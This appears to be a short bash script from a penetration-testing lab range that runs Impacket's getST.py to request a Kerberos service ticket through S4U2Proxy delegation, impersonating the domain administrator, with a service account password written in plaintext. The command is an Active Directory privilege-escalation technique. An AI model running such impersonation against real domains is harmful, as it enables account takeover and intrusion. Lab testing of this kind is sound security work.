#!/bin/bash
# getST cross-check for the S4U2Proxy BADOPTION (run ON provisioning)
/home/vagrant/campaign-venv/bin/getST.py -spn HTTP/mbr02.range.local -impersonate administrator -dc-ip 192.168.77.12 'range/svc_sccm:s3rv1c3_SCCM!' -k 2>&1 | tail -30
